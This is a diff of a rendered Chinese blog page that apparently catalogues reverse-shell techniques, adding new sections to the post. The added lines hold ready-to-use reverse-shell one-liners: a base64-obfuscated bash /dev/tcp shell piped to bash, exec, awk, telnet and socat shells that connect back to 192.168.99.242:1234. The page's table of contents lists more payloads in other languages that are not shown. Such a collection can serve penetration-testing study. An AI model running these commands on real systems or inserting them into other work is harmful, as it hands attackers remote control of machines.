@@ -414,13 +414,13 @@
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1.7k字</p>
+      <p>字数：1.8k字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：7分钟</p>
+      <p>时长：8分钟</p>
     </a>
   </div>
 
@@ -505,6 +505,18 @@
 </li>
 </ol>
 <p>注：<code>/dev/tcp/</code> 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在<code>/dev/udp/</code>。</p>
+<p>base64编码地址：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzkwMDAgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5;<span class="keyword">done</span></span><br><span class="line"><span class="built_in">exec</span> /bin/sh 0&lt;/dev/tcp/192.168.99.242/1234 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.99.242/1234&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321</span><br></pre></td></tr></table></figure>
+
+<h3 id="socat反弹"><a href="#socat反弹" class="headerlink" title="socat反弹"></a>socat反弹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234</span><br></pre></td></tr></table></figure>
+
 <h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>Linux中nc命令是一个功能强大的网络工具，全称是netcat</p>
 <p>选项：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h：在线帮助；</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l：使用监听模式，监控传入的资料；</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口；</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择；</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；</span><br><span class="line">-u：使用UDP传输协议；</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间；</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure>
@@ -611,10 +623,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-11-29T16:42:49+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-04T20:21:27+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2019年11月29日</p>
+    <p>更新于：2021年2月4日</p>
   </a>
 </div>
 
@@ -761,7 +773,7 @@ sudo apt-get u...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-1"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-2"><span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash"><span class="toc-text">bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netcat"><span class="toc-text">netcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell"><span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl"><span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-text">Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lua"><span class="toc-text">Lua</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-text">shell下载文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-1"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-2"><span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash"><span class="toc-text">bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-text">exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#awk"><span class="toc-text">awk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#telnet"><span class="toc-text">telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socat%E5%8F%8D%E5%BC%B9"><span class="toc-text">socat反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netcat"><span class="toc-text">netcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell"><span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl"><span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-text">Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lua"><span class="toc-text">Lua</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-text">shell下载文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li></ol></li></ol>
     </div>
   </section>
 
